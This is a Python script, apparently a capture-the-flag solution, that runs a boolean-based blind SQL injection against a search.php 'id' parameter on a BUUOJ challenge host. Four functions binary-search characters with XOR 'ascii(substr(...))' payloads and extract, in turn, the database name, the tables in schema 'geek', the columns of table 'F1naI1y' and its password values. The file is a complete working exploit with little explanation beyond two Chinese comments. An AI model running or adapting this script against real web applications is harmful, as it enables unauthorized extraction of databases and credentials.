def bomb_database_name():
    import requests
    name = ""
    url_front="http://fbb3589c-5d16-4b53-bdc9-c39b713cc688.node3.buuoj.cn/search.php?id="
    for i in range(1,1000):
        low = int(32)
        high = int(128)
        mid=int((low+high)/2)
        while low<high:
            payload = "1^(ascii(substr(database(),%d,1))>%d)#"% (i,mid)
            s = requests.session()
            url = url_front + payload
            r = s.get(url)
            if "ERROR" in r.text:  #sql语句为真，在后半段
                low = mid + 1
            else:
                high = mid
            mid =int((low+high)/2)
            #print(mid,low,high)
        if mid == 32:
            break
        name = name + chr(mid)
        print(name)

def bomb_table_name():
    import requests
    name = ""
    url_front="http://fbb3589c-5d16-4b53-bdc9-c39b713cc688.node3.buuoj.cn/search.php?id="
    for i in range(1,1000):
        low = int(32)
        high = int(128)
        mid=int((low+high)/2)
        while low<high:
            payload = "1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))>%d)#"% (i,mid)
            s = requests.session()
            url = url_front + payload
            r = s.get(url)
            if "ERROR" in r.text:  #sql语句为真，在后半段
                low = mid + 1
            else:
                high = mid
            mid =int((low+high)/2)
            #print(mid,low,high)
        if mid == 32:
            break
        name = name + chr(mid)
        print(name)
        

def bomb_column_name():
    import requests
    name = ""
    url_front="http://fbb3589c-5d16-4b53-bdc9-c39b713cc688.node3.buuoj.cn/search.php?id="
    for i in range(1,1000):
        low = int(32)
        high = int(128)
        mid=int((low+high)/2)
        while low<high:
            payload = "1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='F1naI1y'),%d,1))>%d)#"% (i,mid)
            s = requests.session()
            url = url_front + payload
            r = s.get(url)
            if "ERROR" in r.text:  #sql语句为真，在后半段
                low = mid + 1
            else:
                high = mid
            mid =int((low+high)/2)
            #print(mid,low,high)
        if mid == 32:
            break
        name = name + chr(mid)
        print(name)

def bomb_flag_name():
    import requests
    name = ""
    url_front="http://fbb3589c-5d16-4b53-bdc9-c39b713cc688.node3.buuoj.cn/search.php?id="
    for i in range(1,1000):
        low = int(32)
        high = int(128)
        mid=int((low+high)/2)
        while low<high:
            payload = "1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)#"% (i,mid)
            s = requests.session()
            url = url_front + payload
            r = s.get(url)
            if "ERROR" in r.text:  #sql语句为真，在后半段
                low = mid + 1
            else:
                high = mid
            mid =int((low+high)/2)
            #print(mid,low,high)
        if mid == 32:
            break
        name = name + chr(mid)
        print(name)

bomb_column_name()